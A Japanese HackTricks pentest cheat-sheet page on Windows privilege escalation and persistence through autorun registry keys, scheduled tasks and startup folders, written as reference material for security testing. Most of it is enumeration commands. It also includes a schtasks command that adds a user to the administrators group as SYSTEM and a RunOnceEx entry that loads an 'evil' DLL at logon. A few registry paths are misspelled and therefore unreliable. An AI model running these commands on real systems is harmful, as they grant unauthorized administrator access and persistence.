# Autorunsを使用した特権エスカレーション

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**最新バージョンのPEASSを入手したり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
* **ハッキングのトリックを共有するには、[hacktricksリポジトリ](https://github.com/carlospolop/hacktricks)と[hacktricks-cloudリポジトリ](https://github.com/carlospolop/hacktricks-cloud)**にPRを提出してください。

</details>

<img src="../../.gitbook/assets/image (1) (1) (1) (1).png" alt="" data-size="original">

もしあなたが**ハッキングのキャリア**に興味があり、アンハッカブルをハックしたいのであれば、**採用中です！**（流暢なポーランド語の読み書きが必要です）。

{% embed url="https://www.stmcyber.com/careers" %}

## WMIC

**Wmic**は、**起動時**にプログラムを実行するために使用できます。次のコマンドで、起動時にプログラムが設定されているバイナリを確認できます。
```bash
wmic startup get caption,command 2>nul & ^
Get-CimInstance Win32_StartupCommand | select Name, command, Location, User | fl
```
## スケジュールされたタスク

**タスク**は、**特定の頻度**で実行されるようにスケジュールできます。次のコマンドでスケジュールされたバイナリを確認します。
```bash
schtasks /query /fo TABLE /nh | findstr /v /i "disable deshab"
schtasks /query /fo LIST 2>nul | findstr TaskName
schtasks /query /fo LIST /v > schtasks.txt; cat schtask.txt | grep "SYSTEM\|Task To Run" | grep -B 1 SYSTEM
Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State

#Schtask to give admin access
#You can also write that content on a bat file that is being executed by a scheduled task
schtasks /Create /RU "SYSTEM" /SC ONLOGON /TN "SchedPE" /TR "cmd /c net localgroup administrators user /add"
```
## フォルダ

**スタートアップフォルダに配置されたすべてのバイナリは、起動時に実行されます**。一般的なスタートアップフォルダは以下にリストされていますが、スタートアップフォルダはレジストリで指定されています。[ここを読んで、場所を確認してください。](privilege-escalation-with-autorun-binaries.md#startup-path)
```bash
dir /b "C:\Documents and Settings\All Users\Start Menu\Programs\Startup" 2>nul
dir /b "C:\Documents and Settings\%username%\Start Menu\Programs\Startup" 2>nul
dir /b "%programdata%\Microsoft\Windows\Start Menu\Programs\Startup" 2>nul
dir /b "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup" 2>nul
Get-ChildItem "C:\Users\All Users\Start Menu\Programs\Startup"
Get-ChildItem "C:\Users\$env:USERNAME\Start Menu\Programs\Startup"
```
## レジストリ

{% hint style="info" %}
注意: **Wow6432Node** レジストリエントリは、64ビットのWindowsバージョンを実行していることを示しています。オペレーティングシステムは、64ビットのWindowsバージョンで実行される32ビットアプリケーションのために、HKEY\_LOCAL\_MACHINE\SOFTWAREの別のビューを表示するためにこのキーを使用します。
{% endhint %}

### Runs

**一般的に知られている** AutoRun レジストリ:

* `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`
* `HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce`
* `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run`
* `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce`
* `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
* `HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce`
* `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run`
* `HKCU\Software\Wow6432Npde\Microsoft\Windows\CurrentVersion\RunOnce`
* `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run`
* `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Runonce`
* `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunonceEx`

RunおよびRunOnceレジストリキーは、ユーザーがログオンするたびにプログラムを実行させます。キーのデータ値は、260文字を超えないコマンドラインです。

**Service runs** (起動時にサービスの自動起動を制御できます):

* `HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce`
* `HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce`
* `HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices`
* `HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices`
* `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce`
* `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce`
* `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices`
* `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices`

**RunOnceEx:**

* `HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnceEx`
* `HKEY_LOCAL_MACHINE\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnceEx`

これは、Windows Vista以降ではデフォルトで作成されません。レジストリの実行キーのエントリは、プログラムを直接参照するか、依存関係としてリストすることができます。たとえば、RunOnceExを使用してログオン時にDLLをロードすることができます: `reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /d "C:\temp\evil[.]dll"`

{% hint style="info" %}
**Exploit 1**: **HKLM** 内のいずれかのレジストリに書き込むことができれば、別のユーザーがログインすると特権をエスカレーションできます。
{% endhint %}

{% hint style="info" %}
**Exploit 2**: **HKLM** 内のいずれかのレジストリに示されているバイナリを上書きすることができれば、別のユーザーがログインするとそのバイナリをバックドアで変更し、特権をエスカレーションできます。
{% endhint %}
```bash
#CMD
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunE

reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices
reg query HKCU\Software\Wow5432Node\Microsoft\Windows\CurrentVersion\RunServices

reg query HKLM\Software\Microsoft\Windows\RunOnceEx
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\RunOnceEx
reg query HKCU\Software\Microsoft\Windows\RunOnceEx
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\RunOnceEx

#PowerShell
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunE'

Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices'

Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\RunOnceEx'
```
### スタートアップパス

* `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders`
* `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders`
* `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders`
* `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders`

サブキーのスタートアップが指す場所に作成されたショートカットは、ログオン/再起動時にサービスを起動します。スタートアップの場所は、ローカルマシンと現在のユーザーの両方で指定されます。

{% hint style="info" %}
\[User] Shell Folderのいずれかを**HKLM**で上書きできれば、それを自分が制御するフォルダに指定し、バックドアを配置して特権を昇格させることができます。
{% endhint %}
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" /v "Common Startup"
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v "Common Startup"
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v "Common Startup"
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" /v "Common Startup"

Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders' -Name "Common Startup"
```
### Winlogonキー

`HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`

通常、**Userinit**キーはuserinit.exeを指し示しますが、このキーを変更できる場合、そのexeもWinlogonによって起動されます。\
**Shell**キーはexplorer.exeを指し示すべきです。
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Userinit"
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Shell"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name "Userinit"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name "Shell"
```
{% hint style="info" %}
レジストリの値またはバイナリを上書きすることができれば、特権を昇格させることができます。
{% endhint %}

### ポリシー設定

* `HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer`
* `HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer`

**Run** キーを確認してください。
```bash
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "Run"
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "Run"
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer' -Name "Run"
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer' -Name "Run"
```
### AlternateShell

パス: **`HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot`**

レジストリキー `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SafeBoot` の下には、デフォルトで **AlternateShell** という値があります。この値は、通常 `cmd.exe`（コマンドプロンプト）に設定されています。起動時にF8キーを押して「コマンドプロンプト付きのセーフモード」を選択すると、システムはこの代替シェルを使用します。\
ただし、F8キーを押さずに「コマンドプロンプト付きのセーフモード」を選択できるように、ブートオプションを作成することもできます。

1. boot.ini（c:\boot.ini）ファイルの属性を編集して、ファイルを読み取り専用、システム、非表示にしないようにします（attrib c:\boot.ini -r -s -h）。
2. boot.iniを開きます。
3. 以下のような行を追加します: `multi(0)disk(0)rdisk(0)partition(1)\WINDOWS="Microsoft Windows XP Professional" /fastdetect /SAFEBOOT:MINIMAL(ALTERNATESHELL)`
4. ファイルを保存します。
5. 正しい権限を再適用します（attrib c:\boot.ini +r +s +h）。

情報は[こちら](https://www.itprotoday.com/cloud-computing/how-can-i-add-boot-option-starts-alternate-shell)から入手しました。

{% hint style="info" %}
**Exploit 1:** このレジストリキーを変更できれば、バックドアを指定することができます。
{% endhint %}

{% hint style="info" %}
**Exploit 2 (PATHの書き込み権限)**: システムのPATH内の_C:\Windows\system32_ より前の任意のフォルダに書き込み権限がある場合（または変更できる場合）、cmd.exeファイルを作成し、セーフモードでマシンを起動するとバックドアが実行されます。
{% endhint %}

{% hint style="info" %}
**Exploit 3 (PATHの書き込み権限とboot.iniの書き込み権限)**: boot.iniを書き込むことができれば、次回の再起動時に自動的にセーフモードで起動できます。
{% endhint %}
```bash
reg query HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot /v AlternateShell
Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SafeBoot' -Name 'AlternateShell'
```
### インストールされたコンポーネント

* `HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components`
* `HKLM\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components`
* `HKCU\SOFTWARE\Microsoft\Active Setup\Installed Components`
* `HKCU\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components`

Active Setupはデスクトップが表示される前に実行されます。Active Setupによって開始されたコマンドは同期的に実行され、実行中はログオンがブロックされます。Active Setupは、RunまたはRunOnceレジストリエントリが評価される前に実行されます。

これらのキーの中には、さらにキーがあり、それぞれに興味深いキーと値が含まれています。最も興味深いものは次のとおりです。

* **IsInstalled:**
* 0: コンポーネントのコマンドは実行されません。
* 1: コンポーネントのコマンドはユーザーごとに一度だけ実行されます。これがデフォルトです（IsInstalled値が存在しない場合）。
* **StubPath**
* 形式: 有効なコマンドライン、例: "notepad"
* これは、Active Setupがログオン時にこのコンポーネントを実行する必要があると判断した場合に実行されるコマンドです。

{% hint style="info" %}
_**IsInstalled == "1"**_ であるキー **StubPath** のいずれかに書き込み/上書きすることができれば、それをバックドアに指定して特権をエスカレーションすることができます。また、**StubPath** キーが指定する **バイナリ** を上書きすることができれば、特権をエスカレーションすることができます。
{% endhint %}
```bash
reg query "HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKCU\SOFTWARE\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKCU\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components" /s /v StubPath
```
### ブラウザヘルパーオブジェクト

* `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects`
* `HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects`

**ブラウザヘルパーオブジェクト**（**BHO**）は、MicrosoftのInternet Explorerウェブブラウザのプラグインとして追加機能を提供するために設計されたDLLモジュールです。これらのモジュールは、Internet Explorerの新しいインスタンスごとおよびWindows Explorerの新しいインスタンスごとに実行されます。ただし、BHOは、キー**NoExplorer**を1に設定することで、各Explorerのインスタンスでの実行を防止することができます。

BHOは、Windows 10のInternet Explorer 11までサポートされていますが、デフォルトのWebブラウザであるMicrosoft Edgeではサポートされていません。
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects" /s
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects" /s
```
注意：レジストリには、各DLLごとに1つの新しいレジストリが含まれており、それは**CLSID**によって表されます。CLSIDの情報は、`HKLM\SOFTWARE\Classes\CLSID\{<CLSID>}`で見つけることができます。

### Internet Explorerの拡張機能

* `HKLM\Software\Microsoft\Internet Explorer\Extensions`
* `HKLM\Software\Wow6432Node\Microsoft\Internet Explorer\Extensions`

注意：レジストリには、各DLLごとに1つの新しいレジストリが含まれており、それは**CLSID**によって表されます。CLSIDの情報は、`HKLM\SOFTWARE\Classes\CLSID\{<CLSID>}`で見つけることができます。

### フォントドライバ

* `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers`
* `HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers`
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers"
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers'
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers'
```
### オープンコマンド

* `HKLM\SOFTWARE\Classes\htmlfile\shell\open\command`
* `HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command`
```bash
reg query "HKLM\SOFTWARE\Classes\htmlfile\shell\open\command" /v ""
reg query "HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command" /v ""
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Classes\htmlfile\shell\open\command' -Name ""
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command' -Name ""
```
### Image File Execution Options

イメージファイルの実行オプション

Image File Execution Options（IFEO）は、Windowsのデバッグ機能を利用して、実行されるプロセスに対して特定の設定を適用するための機能です。IFEOを使用すると、特定のバイナリファイルが実行される際に、追加のデバッグプログラムやスクリプトを自動的に実行することができます。

この機能は、特権昇格攻撃に利用されることがあります。攻撃者は、IFEOを使用してシステム上の特定のバイナリファイルを指定し、そのバイナリが実行されるたびに攻撃者が用意したプログラムやスクリプトが実行されるように設定します。これにより、攻撃者は特権を昇格させるための悪意のあるコードを実行することができます。

IFEOを使用した特権昇格攻撃を防ぐためには、以下の対策を実施することが重要です。

- IFEOのエントリを監視し、不正な変更があった場合には検知すること。
- 不要なIFEOエントリを削除すること。
- IFEOエントリに対して適切なアクセス制御を設定すること。

これらの対策を実施することで、IFEOを悪用した特権昇格攻撃からシステムを保護することができます。
```
HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options
HKLM\Software\Microsoft\Wow6432Node\Windows NT\CurrentVersion\Image File Execution Options
```
## SysInternals

注意してください、autorunsを見つけることができるすべてのサイトは、すでにwinpeas.exeによって検索されています。ただし、より包括的な自動実行ファイルのリストが必要な場合は、systinternalsの[autoruns](https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns)を使用することができます。
```
autorunsc.exe -m -nobanner -a * -ct /accepteula
```
## その他

[https://www.microsoftpressstore.com/articles/article.aspx?p=2762082\&seqNum=2](https://www.microsoftpressstore.com/articles/article.aspx?p=2762082\&seqNum=2)でレジストリのようなAutorunsをさらに見つけることができます。

## 参考文献

* [https://resources.infosecinstitute.com/common-malware-persistence-mechanisms/#gref](https://resources.infosecinstitute.com/common-malware-persistence-mechanisms/#gref)
* [https://attack.mitre.org/techniques/T1547/001/](https://attack.mitre.org/techniques/T1547/001/)
* [https://www.microsoftpressstore.com/articles/article.aspx?p=2762082\&seqNum=2](https://www.microsoftpressstore.com/articles/article.aspx?p=2762082\&seqNum=2)

<img src="../../.gitbook/assets/image (1) (1) (1) (1).png" alt="" data-size="original">

もしあなたが**ハッキングのキャリア**に興味があり、**解読不能なものをハック**したい場合 - **採用中です！**（流暢なポーランド語の読み書きが必要です）。

{% embed url="https://www.stmcyber.com/careers" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業**で働いていますか？ **HackTricksであなたの会社を宣伝**したいですか？または、**最新バージョンのPEASSを入手したり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください、私たちの独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションを。
* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**をフォロー**してください。
* **ハッキングのトリックを共有するには、[hacktricks repo](https://github.com/carlospolop/hacktricks)と[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**にPRを提出してください。

</details>
